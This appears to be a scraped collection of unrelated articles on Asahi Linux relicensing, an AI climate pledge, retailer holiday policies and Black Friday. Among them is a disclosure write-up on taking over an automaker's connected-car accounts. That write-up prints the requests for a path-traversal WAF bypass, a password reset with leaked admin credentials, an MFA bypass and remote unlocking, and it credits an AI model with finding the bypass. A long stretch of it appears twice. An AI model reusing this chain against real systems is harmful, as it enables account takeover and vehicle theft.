articles.title: Asahi Linux Drops MIT, Goes Full GPL After AI Used to Steal Unreleased Code
articles.body:
Asahi Linux is the reason you can run Linux on an Apple Silicon Mac today. For years, the project put most of its own code under the MIT license so that anyone, including the BSDs, could reuse it as needed.
That is changing because Asahi Linux is tired of code laundering. They have announced that Asahi is moving all of its repositories to the GNU General Public License version 2 or later. Going forward, all Asahi Linux code will be under strong copyleft licenses only.
This is because people were taking in-development code straight out of their personal forks, publishing it without credit, or rewriting it with AI to hide its origin for "replacing the project and aggressively monetising Linux on Apple Silicon."
What is code laundering?
Code laundering (also called license laundering) is the practice of taking someone else's code and passing it through a process that hides where it came from, so you can use it without honoring the original license or crediting the author.
Before AI, this usually meant manually rewriting code line by line, renaming variables and stuff, and shuffling functions around until it no longer looked like the original.
LLMs made it much more easy and cheaper of course.
Learning from history
The move has come after the Asahi team was made aware "some time ago" of multiple attempts to exploit its permissive licensing to hijack its work.
In the most extreme cases, feature code that was still under development was lifted from developers' personal forks before it was even publicly released. The report points out that the MIT license "explicitly allows this, and has no carveouts to protect against bad faith actors."
Asahi didn't name anyone in the report. It also didn't spell out how existing contributions will be relicensed or whether every past contributor agreed to it.
Asahi draws parallels with WINE's situation two decades ago. WINE, the compatibility layer that lets you run Windows apps on Linux, was originally MIT-licensed too. But in the late 90s and early 2000s, companies took the code, built proprietary forks on top of it, and sold them commercially. So, in 2002, the WINE team relicensed to the LGPL to discourage proprietary forks and push companies to contribute upstream.
Those who do not learn from history are doomed to repeat it
Asahi has been upset lately
Asahi didn't name anyone so we are left with guesswork on who they are targeting with this license move.
There have been at least two public forks of Asahi's work in recent months, both tied to AI-assisted development. In case you did not know, Asahi Linux forbids AI generated code contribution.
The first is Aurora Silicon and its Vulkan driver, Borealis. Borealis is a fork of Asahi's HoneyKrisp, the Vulkan driver for Apple GPUs. Aurora Silicon submitted a pull request to register its own Vulkan driver ID with Khronos (VK_DRIVER_ID_AURORA_BOREALIS), says the driver runs on M1 to M5 and the A18 Pro, and keeps it in its own Mesa fork rather than upstream. 
The second is Gravity Linux, a Fedora-based distro for Apple Silicon. It was forked from Asahi over the disagreement about LLM use.
To be fair to Gravity, it is open source, it isn't selling anything, and it credits its AI use openly. It even says it plans to sunset the distro once its driver work lands upstream.
It isn't the kind of bad actor the progress report describes. But it does represent the "permissive fork that embraces AI" approach that Asahi has consistently pushed back against.
Why this license change matters
As far as I can tell, this is the first time a major open source project has moved to copyleft specifically because of AI-assisted code laundering. Projects have relicensed before, but usually to stop cloud providers from reselling their work as a service. This one is specifically about AI.
I wouldn't be surprised if more hardware enablement and reverse-engineering projects follow. Making the first changes takes a lot of time and effort but they are easier to "rewrite" once someone has done the hard part.
Will the GPL actually help?
If the problem is people who already ignore the MIT license, why would they respect the GPL? After all, GPL cannot stop a determined bad actor. Nothing does, actually.
Stripping attribution from MIT code already breaks the MIT license, since keeping the copyright notice is its one real condition.
What the GPL changes is the commercial benefit. Under MIT, someone can take Asahi's code, close it up, and sell a product, and that's perfectly legal as long as the notice stays in.
Under the GPL, anyone who distributes a modified version has to release the source under the same license. You can't legally build a closed, paid Apple Silicon distro on top of GPL code. And if a product's source has to be public, the copying is easier to spot.
Not everyone is happy
The move has drawn criticism, particularly from the BSD side, which was one of the main reasons Asahi chose MIT in the first place. OpenBSD's Apple Silicon support relies on Asahi's m1n1 bootloader.
OpenBSD developer Bryan Steele wrote on X:
"Sad to see Asahi out there burning bridges for no reason.. relicensing m1n1 and drivers under GPL2-or-later, seemingly without the consent of all prior contributors, under the guise of "defending against AI bad actors", seems entirely disingenuous and misguided."
Wrapping up
Asahi is betting that copyleft license provides a better defense in this changed world where anyone can launder code with a prompt.
It may not stop the bad actors from rewriting its code, but at least it reduces the chances of a closed commercial fork.
It would be interesting to see whether the BSD community finds a way to keep working with Asahi under the new terms.

articles.title: Unlocking any car from X brand in most of the world
articles.body:
unlocking any car from X brand in most of the world
I've always had a soft spot for this particular car brand. Our family has owned a few of them over the years, and they've served us incredibly well. In 2023, I bought a new four wheel drive/SUV from them, and it was the first time I had access to their connected car platform.
Having looked at platforms like this before (previous works), I was sceptical about how secure they really were. I suspected there was something there, but life kept getting in the way of actually looking. This July, I collaborated with Sam Curry to take a look at the security of a major automaker's connected car systems. Throughout this post, I'll refer to them simply as "the automaker".
When you typically think of car hacking, it's often easy to jump into the hardware side of things, but my background sits pretty squarely in compromising internet-facing web applications and infrastructure. Regardless of all the hardware bits and bobs, it all connects back to some service that, by design, has to be reachable from the internet.
The journey started with a simple question: what infrastructure does the app talk to when I remotely unlock my car? To work this out, I downloaded the APK and decompiled it, eventually reconstructing the API requests that were being made.
Going through the code, the primary point of contact seemed to be assets under *.redacted-telematics.com.au:
dartExecutor.executeDartEntrypoint(createDefault, CollectionsKt.r(gson.toJson(new GlobalConfigParams(false, g11, com.redacted.app.xcapp.a.f69866f, "X", str)), new Gson().toJson(new ApiConfig("https://api.redacted-telematics.com.au", "https://api.redacted-telematics.com.au", "https://api.redacted-telematics.com.au" ...
Almost every part of the consumer application called back to redacted-telematics.com.au. What else existed under this domain?
The admin tool
Running connected car infrastructure can be quite complex, and managing it requires a mix of admin tools, staging, dev, and QA environments, to make sure that customers get a clean experience. Whether all of that should be sitting on the public internet, available to anyone willing to do some basic reconnaissance, is a different story.
One asset caught my attention more than the others. admintool.redacted-telematics.com.au returned a page titled TEST HARNESS. Who can resist a subdomain with admintool in it?
Visiting this subdomain presented a very plain and grey login screen, which didn't exactly ooze quality, given it presented a logout button before we'd logged in.
I love that most single-page applications ship their entire JavaScript bundle even when all they need to render is a login page. Sure, some more modern frameworks split out JavaScript files so that they only serve what is necessary, but in this case, we could comb through the large JavaScript bundle to understand what this "admin tool" actually let you do.
Turns out this admin tool let you do quite a lot. It had a rich API that let the automaker's employees interact with customer accounts and production vehicles with very few restrictions. Reconstructing the requests, we found that a lot of these APIs needed no authentication beyond the hardcoded API keys sitting in the JavaScript bundle.
For example, we could look up user accounts by email address:
But that's just not good enough. If we want to unlock any of their cars from just knowing the number plate, we're going to need to do better than that.
In Australia, a number plate gets you the VIN (vehicle identification number) fairly easily through state-based registration lookup sites.
This isn't really a security flaw. There are plenty of legitimate reasons to want a VIN, like checking a car's true repair and insurance history before buying second-hand. If we could go from VIN to a subscriber or email, we'd complete the chain.
Fortunately, there was an API that let you do exactly that:
With the subscriber GUID, you could pull the full account details (including the user's email via the /v1/account endpoint) like so:
Well, I guess we have the first part of our chain sorted. Plate -> VIN -> Subscriber GUID -> User Account PII (email) registered on the automaker's identity platform (ForgeRock OpenIDM).
Now, how do we send commands to any car we want? Surely this admin tool would let us do that? Unfortunately, no. It let us provision features to a car, add ourselves to a user's account as a secondary user, and even generate remote access codes. But for all that functionality, none of it actually got us remote control of a vehicle.
The identity platform
Sam and I then spent two weeks digging into how the automaker manages their central identity system: the software they use, the way commands are issued, and how consumers authenticate.
When a user goes through the authentication flow for the automaker's mobile app, requests are made to login.redacted-identity.com.au, and after going through an MFA flow, a consumer auth token is finally issued. This auth token is then used for subsequent requests to api.redacted-telematics.com.au (both REST APIs and GraphQL). Once you have that auth token, it's pretty much game over. You can control a user's car (remote unlock/lock, horns, engine, etc).
So if we could mint a token for any user, we'd finally be able to control anyone's connected car. This is the angle we went for.
The automaker is a heavy user of ForgeRock's identity software (OpenAM/OpenIDM). This is the cornerstone of their authentication mechanisms. Pulling the subdomains for *.redacted-identity.com.au, we quickly found their OpenIDM instance at openidm.redacted-identity.com.au. This is the system that manages every identity registered on the automaker's connected car platform.
This all clicked together when we were combing through the JavaScript files under *.redacted-telematics.com.au and we came across an absolutely cursed vendor JavaScript bundle that embedded admin credentials for OpenIDM 😱:
Even though these admin credentials were meant to be for their staging environment, given the hygiene we'd seen so far, we were pretty sure they'd work in production too.
Fighting the WAF
Looking closer at OpenIDM, we couldn't tell whether the automaker knew how fragile it was. One thing was obvious though: they'd invested heavily in WAF rules to block access to the sensitive APIs that ForgeRock typically lets you call via /openidm/*.
Even with the origin IP, any request to /openidm/ came straight back as an Nginx WAF block. Someone had put real effort into hardening these assets (despite them being externally accessible).
Fair enough, and we respect the hardening. But that much WAF investment usually means bandaids over something known to be bad. They probably understood how bad it was to have this asset exposed at all, and some business case kept it there anyway.
I'm not sure a WAF rule has ever stopped us when we're motivated enough, so we invested days into finding a way out of these protections, using our trusty path traversal tricks. How hard could it be?
Validating the admin credentials we found inside the JavaScript bundle was not that tough. The Australian OpenIDM instance had a few paths whitelisted like /XUI/ and /UI/, and path traversal characters were not blocked, so something as simple as /XUI/..%2fopenidm/endpoint seemed to at least partially work:
But it can never be as simple as that, right? The path traversal still didn't get us to the endpoints under /openidm/, thanks to quirks in how OpenIDM handles routing. Every endpoint would error out like so:
In OpenIDM's world, there were no servlets (or resources) registered against paths that included the path traversal within them. So it would just error out, even though it issued us an admin JWT.
We were incredibly annoyed by this. A simple quirk in routing mechanisms (probably not even designed as a security consideration) was blocking the full attack chain from working. We sat frustrated for a few days, and we thought that the path traversal angle just wasn't going to work. We did find a few other endpoints (user upload, for example) that looked like they might work, but we hit another quirk, a servlet path check, that prevented us from using them meaningfully.
All of this made us ask a different question: why expose these OpenIDM instances externally at all? Surely there had to be some legitimate use case for these assets to be exposed on the internet? We went back to the different JavaScript bundles we had collected from their assets and searched them for communications to OpenIDM. We turned to the decompiled Android application and found the following:
These were clearly endpoints within their OpenIDM asset that were contactable from the Android app. So, maybe these were accessible without the WAF getting in the way?
- /openidm/endpoint/aaa -> 403 WAF blocked
- /openidm/endpoint/pinService -> 404, no WAF block
Interesting!
What other custom endpoints existed? With some very light brute forcing and guessing, we quickly found a getUser endpoint. Guessing at parameters, we found it accepted mail, guid, and phone. Combined with our admin credentials, what did this really let us do?
The response came back with the password hash, PIN code hash, mobile push tokens, and PII including mobile numbers and full names. There was no WAF block on this endpoint, so no path traversal was needed and the correct servlet responded.
Don't get me wrong, this was already pretty impactful. But the passwords were hashed with PBKDF2-SHA512, and needing time on a hash cracking rig for every unlock, with no guarantee of success, felt a bit lacklustre.
Back to the drawing board. How could we access the /openidm/managed/user servlet with our path traversal, and still have the path be recognised by OpenIDM? We grabbed the OpenIDM source closest to the version we were testing against and let GPT 5.6 Sol Ultra spend a good six hours on it.
It succeeded. Even though Sam and I had both spent time trying to manually bypass this juvenile restriction ourselves, we hadn't tried every possible combination.
When Sam and I tried /XUI%2f..%2fopenidm/, we got a hard 403, and being human, we assumed that applied to every prefix. What GPT 5.6 found was that /static%2f..%2fopenidm/ wasn't covered by the WAF at all, and it gave us the OpenIDM APIs without the servlet confusion issue.
Taking over accounts
With this bypass, taking over an account became trivial. We could PATCH a new password for any user profile:
PATCH /static%2f..%2fopenidm/managed/user/f7ba554REDACTED HTTP/1.1
Host: openidm.redacted-identity.com.au
X-OpenIDM-Username: idmadmin
X-OpenIDM-Password: REDACTED
X-OpenIDM-NoSession: true
Content-Type: application/json
If-Match: "0000000abc123..."
Cache-Control: no-store
Accept: application/json
[{"operation":"replace","field":"/password","value":"Testing123!"}]
Which responded with:
> HTTP/1.1 200 OK
> {"_id":"f7ba554REDACTED","_rev":"0000000def456..."}
OK, so we could overwrite the password for any user. But what about multi-factor authentication?
Skipping MFA
Well, the automaker's Australian environment had one more misconfiguration: the multi-factor step could be skipped entirely. First, we requested an authentication token from login.redacted-identity.com.au with a Resource Owner Password Credentials grant, which returned a clean id_token we could swap for something usable in the consumer app:
POST /oauth2/realms/root/realms/REDACTED/access_token HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded
grant_type=password&[email protected]&password=Testing123!&client_id=REDACTED_PORTAL&client_secret=REDACTED
> HTTP/1.1 200 OK
> {
>   "access_token": "...",
>   "id_token": "eyJ0eXAiOiJKV1Qi...",
>   "token_type": "Bearer",
>   "expires_in": 3599
> }
We took that and moved on to step two, exchanging the first token for a session:
POST /json/realms/REDACTED/authenticate?authIndexType=service&authIndexValue=IDTokenROPC HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/json
Accept: application/json
Accept-API-Version: resource=2.0, protocol=1.0
idtoken: eyJ0eXAiOiJKV1Qi...
> HTTP/1.1 200 OK
> {
>   "tokenId": "AQIC5wM2LY4Sfcy...*",
>   "successUrl": "/openam/console",
>   "realm": "/REDACTED"
> }
Lastly, we performed the token exchange for a mobile app access token:
POST /oauth2/realms/root/realms/REDACTED/authorize HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded
Accept-API-Version: resource=2.1, protocol=1.0
x-fr-version: 2025.05.05
Authorization: Basic <REDACTED>
iPlanetDirectoryPro: AQIC5wM2LY4Sfcy...*
Cookie: iPlanetDirectoryPro=AQIC5wM2LY4Sfcy...*
client_id=REDACTED_APP&redirect_uri=com.redacted.app:/oauth2Callback&scope=openid%20profile%20write&response_type=code&state=<state>&code_challenge=<S256_challenge>&code_challenge_method=S256&decision=allow&csrf=AQIC5wM2LY4Sfcy...*
> HTTP/1.1 302 Found
> Location: com.redacted.app:/oauth2Callback?code=<authorization_code>&state=<state>
POST /oauth2/realms/root/realms/REDACTED/access_token HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded
Accept-API-Version: resource=2.1, protocol=1.0
Authorization: Basic <REDACTED>
grant_type=authorization_code&code=<authorization_code>&redirect_uri=com.redacted.app:/oauth2Callback&client_id=REDACTED_APP&code_verifier=<pkce_verifier>
> HTTP/1.1 200 OK
> {
>   "access_token": "<app_access_token>",
>   "refresh_token": "...",
>   "token_type": "Bearer",
>   "scope": "openid profile write",
>   "expires_in": 3599
> }
It's super convoluted, I know. OAuth is annoyingly hard sometimes. But these steps let us bypass multi-factor authentication for any user of the automaker's connected car app.
Unlocking the car
At this point, we were so damn close to unlocking any of the automaker's cars in Australia. All that was left was issuing the command API requests with the app token we could now mint for anyone.
POST /v1/remote/route/command HTTP/1.1
Host: api.redacted-telematics.com.au
Authorization: Bearer <app_access_token>
X-API-KEY: REDACTED
X-GUID: f7ba554REDACTED
X-BRAND: REDACTED
X-APPBRAND: REDACTED
X-CHANNEL: REDACTED
X-LOCALE: en-AU
X-APPVERSION: REDACTED
X-OSNAME: Android
X-OSVERSION: 14
X-DEVICE-TIMEZONE: AEST
X-CORRELATIONID: 6f1a2b3c-4d5e-6f70-8192-a3b4c5d6e7f8
X-GENERATION: REDACTED
VIN: XXXXXXXXXXXXXXXXX
Content-Type: application/json
Accept: application/json
User-Agent: okhttp/4.12.0
{"command": "door-unlock", "autoFixPopup": false, "beepCount": null}
And magic. The doors unlocked.
We obviously did all of this on cars we explicitly owned or had permission to interact with.
But let's take a step back and think about what we achieved here. We could send commands to any of the automaker's vehicles in Australia, across both of their brands, by only knowing the number plate of the vehicle. The final chain looked like this:
Plate -> VIN -> Subscriber GUID -> OpenIDM admin credentials in JS vendor bundle -> Path traversal to bypass the WAF -> MFA bypass via ROPC flow -> Minting a consumer app token -> Remote command API.
At 12AM, when the full chain finally came together, I took a short video of the script in action. It's not polished, but it still felt magical seeing it all work. I definitely live for hard challenges like these.
You might be wondering: Shubs, you said any of their cars in the world. This only covers Australia. What gives?
There's a much more complex chain that Sam and I worked on together, which he's published on his blog here. It required a lot more work than the steps we took for Australia, as the automaker had spent much more time securing the US, Canadian, and European OpenIDM environments.
At the end of the day, with both writeups combined, we could send remote commands such as unlocking and turning the engines on, for any of the automaker's vehicles in Australia, the United States, and Canada.

Cache-Control: no-store
Accept: application/json
[{"operation":"replace","field":"/password","value":"Testing123!"}]
Which responded with:
> HTTP/1.1 200 OK
> {"_id":"f7ba554REDACTED","_rev":"0000000def456..."}
OK, so we could overwrite the password for any user. But what about multi-factor authentication?
Skipping MFA
Well, the automaker's Australian environment had one more misconfiguration: the multi-factor step could be skipped entirely. First, we requested an authentication token from login.redacted-identity.com.au with a Resource Owner Password Credentials grant, which returned a clean id_token we could swap for something usable in the consumer app:
POST /oauth2/realms/root/realms/REDACTED/access_token HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded
grant_type=password&[email protected]&password=Testing123!&client_id=REDACTED_PORTAL&client_secret=REDACTED
> HTTP/1.1 200 OK
> {
>   "access_token": "...",
>   "id_token": "eyJ0eXAiOiJKV1Qi...",
>   "token_type": "Bearer",
>   "expires_in": 3599
> }
We took that and moved on to step two, exchanging the first token for a session:
POST /json/realms/REDACTED/authenticate?authIndexType=service&authIndexValue=IDTokenROPC HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/json
Accept: application/json
Accept-API-Version: resource=2.0, protocol=1.0
idtoken: eyJ0eXAiOiJKV1Qi...
> HTTP/1.1 200 OK
> {
>   "tokenId": "AQIC5wM2LY4Sfcy...*",
>   "successUrl": "/openam/console",
>   "realm": "/REDACTED"
> }
Lastly, we performed the token exchange for a mobile app access token:
POST /oauth2/realms/root/realms/REDACTED/authorize HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded
Accept-API-Version: resource=2.1, protocol=1.0
x-fr-version: 2025.05.05
Authorization: Basic <REDACTED>
iPlanetDirectoryPro: AQIC5wM2LY4Sfcy...*
Cookie: iPlanetDirectoryPro=AQIC5wM2LY4Sfcy...*
client_id=REDACTED_APP&redirect_uri=com.redacted.app:/oauth2Callback&scope=openid%20profile%20write&response_type=code&state=<state>&code_challenge=<S256_challenge>&code_challenge_method=S256&decision=allow&csrf=AQIC5wM2LY4Sfcy...*
> HTTP/1.1 302 Found
> Location: com.redacted.app:/oauth2Callback?code=<authorization_code>&state=<state>
POST /oauth2/realms/root/realms/REDACTED/access_token HTTP/1.1
Host: login.redacted-identity.com.au
Content-Type: application/x-www-form-urlencoded
Accept-API-Version: resource=2.1, protocol=1.0
Authorization: Basic <REDACTED>
grant_type=authorization_code&code=<authorization_code>&redirect_uri=com.redacted.app:/oauth2Callback&client_id=REDACTED_APP&code_verifier=<pkce_verifier>
> HTTP/1.1 200 OK
> {
>   "access_token": "<app_access_token>",
>   "refresh_token": "...",
>   "token_type": "Bearer",
>   "scope": "openid profile write",
>   "expires_in": 3599
> }
It's super convoluted, I know. OAuth is annoyingly hard sometimes. But these steps let us bypass multi-factor authentication for any user of the automaker's connected car app.
Unlocking the car
At this point, we were so damn close to unlocking any of the automaker's cars in Australia. All that was left was issuing the command API requests with the app token we could now mint for anyone.
POST /v1/remote/route/command HTTP/1.1
Host: api.redacted-telematics.com.au
Authorization: Bearer <app_access_token>
X-API-KEY: REDACTED
X-GUID: f7ba554REDACTED
X-BRAND: REDACTED
X-APPBRAND: REDACTED
X-CHANNEL: REDACTED
X-LOCALE: en-AU
X-APPVERSION: REDACTED
X-OSNAME: Android
X-OSVERSION: 14
X-DEVICE-TIMEZONE: AEST
X-CORRELATIONID: 6f1a2b3c-4d5e-6f70-8192-a3b4c5d6e7f8
X-GENERATION: REDACTED
VIN: XXXXXXXXXXXXXXXXX
Content-Type: application/json
Accept: application/json
User-Agent: okhttp/4.12.0
{"command": "door-unlock", "autoFixPopup": false, "beepCount": null}
And magic. The doors unlocked.
We obviously did all of this on cars we explicitly owned or had permission to interact with.
But let's take a step back and think about what we achieved here. We could send commands to any of the automaker's vehicles in Australia, across both of their brands, by only knowing the number plate of the vehicle. The final chain looked like this:
Plate -> VIN -> Subscriber GUID -> OpenIDM admin credentials in JS vendor bundle -> Path traversal to bypass the WAF -> MFA bypass via ROPC flow -> Minting a consumer app token -> Remote command API.
At 12AM, when the full chain finally came together, I took a short video of the script in action. It's not polished, but it still felt magical seeing it all work. I definitely live for hard challenges like these.
You might be wondering: Shubs, you said any of their cars in the world. This only covers Australia. What gives?
There's a much more complex chain that Sam and I worked on together, which he's published on his blog here. It required a lot more work than the steps we took for Australia, as the automaker had spent much more time securing the US, Canadian, and European OpenIDM environments.
At the end of the day, with both writeups combined, we could send remote commands such as unlocking and turning the engines on, for any of the automaker's vehicles in Australia, the United States, and Canada.

articles.title: The global pledge to use AI for climate good is a cruel joke
articles.body:
At this point, reading through the latest splashy pledge to use AI for the good of the environment feels like downing a nonalcoholic beer. Admittedly, I’m suspicious from the onset. How can this be good? But I love beer and our planet enough to give it a whirl — and hey, why not try a little harm reduction?
The global pledge to use AI for climate good is a cruel joke
A pledge to make AI less of an environmental disaster is floating around United Nations climate negotiations this month, but it’s just lip service.
Negotiators from more than 190 countries around the world are in Antalya, Turkey, this month for the annual United Nations climate summit, called COP31 (the 31st “Conference of the Parties” that ratified the UN Framework Convention on Climate Change). Turkey previewed its Antalya Artificial Intelligence Pledge ahead of the convening, inviting delegates from other countries to endorse the pledge before its official launch on November 16th.
Like that nonalcoholic beer, it’s deeply unsatisfying
The pledge actually includes some common sense measures that could curb planet-heating pollution from energy-hungry AI data centers. Unfortunately, like that nonalcoholic beer, it’s deeply unsatisfying.
At first glance, many of the ingredients you’d expect from a real commitment on AI’s environmental impact are here. It sets out to ensure that data centers are increasingly powered by clean energy, calling for internationally recognized standards for responsible AI development. Similarly, it pushes for reporting requirements so that there’s greater transparency into the impact data centers — which run primarily on fossil fuels — already have on the environment. It even acknowledges the need to manage the tons of e-waste created by the generative AI boom.
And yet, there is no there there because, as the text states clearly, “these objectives of the pledge are voluntary and non-prescriptive, create no new obligations, and are to be implemented in accordance with national circumstances.” In other words, these are voluntary commitments that countries can choose to follow or not follow based on their whims.
There’s also no way this pledge will garner the support of the most influential player in this game (at least for now). The US has way more data centers than any other country, but Donald Trump has pulled the nation out of the global climate accord and has no official delegates at the summit in Turkey.
The last point in the pledge is to ensure that advances in generative AI can be used to create more renewable energy and reduce greenhouse gas emissions, particularly in economically developing countries. To that end, research published in a Nature journal in August found that AI causes more carbon emissions by boosting fossil fuel production than it would help avoid through gains in renewable energy.
When it comes down to it, this pledge offers a placebo effect at best. In the face of data centers demanding tremendous amounts of electricity and spurring the development of more fossil fuel infrastructure, negotiators can’t be seen as doing nothing about the issue. And with global average temperatures still on the rise, we could all use an emotional support beverage.

articles.title: Here are the shipping and return policies for all the big-name retailers
articles.body:
With the holidays quickly approaching, everyone will soon be on the hunt for gifts and the fastest way to get them. Thankfully, many retailers offer generous shipping policies, with some even providing free two-day shipping or same-day delivery if you’re willing to pay a little extra. And just in case the gift you choose isn’t quite right, many retailers offer extended return policies so your giftee can get something more to their liking.
Here are the shipping and return policies for all the big-name retailers
We’ve read the fine print and rounded up the policies for each major retailer to make things simpler.
For your convenience, we’ve compiled the current shipping and return policies for all the big-name retailers, from Amazon to Walmart. A few already have holiday policies in place, but we’ll be keeping tabs on them and updating our list accordingly. Hopefully, knowing more about how much leeway you have to make a return will help lessen that inevitable holiday angst (fingers crossed).
Amazon
Shipping: Same-day delivery is not available on Thanksgiving, Christmas, or New Year’s (it’s also limited on Black Friday). However, Prime members get free same-day delivery on qualifying orders in qualifying ZIP codes provided they meet the “minimum qualifying dollar threshold” (which varies by location) of eligible items in their cart. One-Day and Two-Day Delivery with no minimum purchase amount required is also available to Prime members for qualifying products. Non-Prime buyers will find shipping options on the order page of each specific product.
Returns: As part of its holiday promotional period, Amazon says most items purchased between November 1st and December 31st can be returned until January 31st, 2027. Apple products, however, must be returned by January 15th, 2027. Note that this policy applies to both Prime and non-Prime buyers.
Apple
Shipping: Apple has yet to provide details on its holiday shipping policy; however, last year, it offered free delivery of in-stock items that hadn’t been engraved by Christmas Eve if you ordered before 9PM ET on December 21st. Apple also offers free next-day or two-hour delivery from local stores in most metro areas for an additional fee, or you can opt to pick up purchases yourself by visiting your local Apple Store.
Returns: Apple is offering an extended return period for online orders received between November 6th and December 25th, allowing you to return items until January 8th, 2027. Purchases made after December 25th are generally subject to the usual terms and conditions, and must be returned within 14 calendar days of your initial purchase date.
Target
Shipping: Target offers free two-day shipping on many orders if you spend $35 or more or use your Target Circle Card. Same-day delivery costs $9.99 per order, but it’s included with a Target Circle 360 membership ($10.99 a month / $99 a year). Your mileage may vary for same-day delivery availability based on the item and your location.
Returns: Target offers an extended return policy for electronics and entertainment items purchased between November 1st and December 24th, allowing you to return them until January 24th, 2027. Mobile phones and Apple products (including Beats products) purchased during the same window must be returned by January 8th, 2027. Target’s standard return policy applies for most other items, with a generous 90-day window for third-party products and up to a year for Target-branded products with a receipt.
Walmart
Shipping: Walmart’s holiday shipping policy doesn’t currently mention a deadline for delivery by Christmas, but it does break down the available fulfillment options. Walmart provides free next-day delivery in eligible ZIP codes, free two-day delivery, and free standard shipping for eligible orders of $35 or more. Walmart Plus subscribers also receive free next-day and two-day shipping with no order minimum. Some orders and ZIP codes may also qualify for same-day delivery, if you’re willing to pay an additional fee.
Returns: Most items purchased between October 1st and December 31st may be returned until January 31st, 2027. Some exceptions, like smartphones, may apply.
B&H Photo
Shipping: B&H Photo offers free two-day and next-day shipping on select items. Most other products qualify for free standard shipping (one to seven business days), and free expedited shipping (one to two business days) is generally available for items over $49.
Returns: B&H Photo allows returns within 30 days of the delivery date, provided the items are in new condition and still housed in their original packaging. For the holidays, most items purchased between November 1st and January 1st can be returned until February 1st, 2027.
Best Buy
Shipping: Best Buy is offering free next-day and two-day shipping on qualifying orders for My Best Buy Plus and My Best Buy Total members. Non-members, meanwhile, can get free next-day shipping on qualifying orders totaling $35 or more. Same-day delivery is also available on select items, seven days a week, and you can check your eligibility by entering your ZIP code in Best Buy’s online portal.
Returns: Best Buy offers a 15-day return window for most products, while “activatable” items like smartphones and wearables, which come with a third-party contract, must be returned within 14 days. My Best Buy Plus and My Best Buy Total members have up to 60 days to make returns, though the 14-day limit still applies to activatable products.
For the holidays, Best Buy has an extended return window, which allows most products purchased between October 30th and December 31st to be returned until January 15th, 2027. The exceptions above surrounding activatable devices still apply, and holiday decorations are also limited to 15 days regardless of their purchase date.
Costco
Shipping: At Costco, shipping fees vary by product and shipping method, although shipping is often free. The wholesale retailer also offers a variety of delivery options, including “white glove” service for larger appliances. Same-day delivery is also available on some items via Costco’s partnership with Instacart.
Returns: Costco generally has an open return policy, except for electronics such as TVs and computers, which have a 90-day return window. Other exceptions are listed on its return page.
GameStop
Shipping: GameStop currently offers free shipping only to GameStop Pro members on orders of $54 or more. It also offers same-day delivery in certain locations if you order from your local store at least three hours before the store closes.
Returns: GameStop hasn’t listed its holiday return policy yet, but you can return products within 15 days, provided the packages are unopened and you have the receipt. Pro members, meanwhile, get 30 days.
Dell
Shipping: Most Dell products include free standard shipping (no minimum purchase required). The delivery window can vary based on your order, but Dell also offers expedited and express shipping options, along with a delivery date estimate based on the ZIP code you provide at checkout. Orders placed by December 23rd with qualifying express delivery windows are expected to arrive before December 25th; Dell’s 2026 Holiday Shipping and Delivery Schedule outlines additional shipping times based on which speed you choose.
Returns: Under Dell’s extended return policy, you can return purchases made between November 1st and December 29th until January 15th, 2027.
DJI
Shipping: DJI offers free shipping on purchases of $200 or more. Otherwise, shipping fees are specified on the order form. Shipment times can vary for each product depending on availability.
Returns: DJI offers returns within 14 days of receiving the purchase, provided the item remains in like-new condition or suffers from a manufacturing defect.
Shipping: All standard orders qualify for free shipping with no minimum. Just note that this applies to the lowest-cost shipping available, which may not be the fastest.
Returns: Google hasn’t announced any special holiday return policies yet. For now, all purchases are covered by the standard terms and conditions, which let you return most items within 15 days of receiving them. Nest Thermostats and Verizon contract phones, however, come with an extended 30-day return window.
HP
Shipping: For many items, standard shipping is free and arrives within three to six days. HP also offers expedited and priority shipping options for an additional fee. The company will not ship or deliver items on Christmas, Thanksgiving, or New Year’s Day.
Returns: You can return most items purchased from HP’s website within 30 days of delivery. There are exceptions, though, and select items may be subject to a restocking fee of up to 15 percent.
Microsoft
Shipping: Most products sold through the online Microsoft Store include free two- or three-day shipping, with express shipping available for an additional fee.
Returns: You can return most physical products purchased online for free through January 31, 2027, as long as they’re in like-new condition. The item must be in its original packaging, with all parts, manuals, and other accessories included. Items exempt from this policy include digital gift cards, gift cards for services and subscriptions, and select hardware, such as the ROG Xbox Ally and Ally X, Surface for Business devices, and HoloLens.
Newegg
Shipping: Many of Newegg’s items come with free shipping and are delivered within one to five business days; for details, check the individual product page.
Returns: Qualifying items purchased between November 1st and December 31st can be returned or replaced until January 31st, 2027.
Sam’s Club
Shipping: According to the Sam’s Club FAQ, shipping costs for most items vary based on the item’s size, weight, shipping method, and delivery address. Plus Members get free shipping on many online items, and same-day delivery or curbside pickup is available for free if you’re a Plus member ($120 a year) and place a qualifying order totaling $50 or more by 1PM local time. Club members ($60 a year) can pay $12 for same-day or next-day shipping, or get free curbside pickup.
Returns: Sam’s Club does not have a specified return period; however, some products may have specific return periods stated. For example, electronics and major appliances have a 90-day return window, while phones are subject to a 14-day return policy.
Sonos
Shipping: Sonos offers free shipping on all products, with in-stock items typically shipping the same day if purchased by 11AM local time. You can also pay extra for two-day or express shipping.
Returns: Sonos offers a 30-day return policy and even provides free return shipping. However, you must have bought the product directly from Sonos, and you must initiate the return within 30 days of receiving your purchase. The product must also include the original packaging and be in new or as-new condition to be eligible.
Update, November 9th: Updated to reflect shipping deadlines and return policies for the 2026 holiday season.

articles.title: Here’s when the Black Friday sales start at Walmart, Target, and other retailers
articles.body:
Black Friday officially kicks off on November 27th, but if you plan to make that the only day you buy gifts this holiday season, you’re missing out. Several prominent retailers, including Best Buy and Walmart, are preparing to roll out their holiday discounts both in-store and online. Best Buy is even offering price protection through the holiday shopping season on select goods, so if you buy early and the same item drops in price, you can get the better deal retroactively.
Here’s when the Black Friday sales start at Walmart, Target, and other retailers
Black Friday is just around the corner, and the early sales are about to begin.
That being said, it’s important to know how every major retailer is handling the shopping event this year, whether you plan to take advantage of the slew of early holiday deals or hold off until the day after Thanksgiving. If you plan to spend some cash, here are the schedules and expectations for Amazon, Walmart, Best Buy, and all the major retailers we know of.
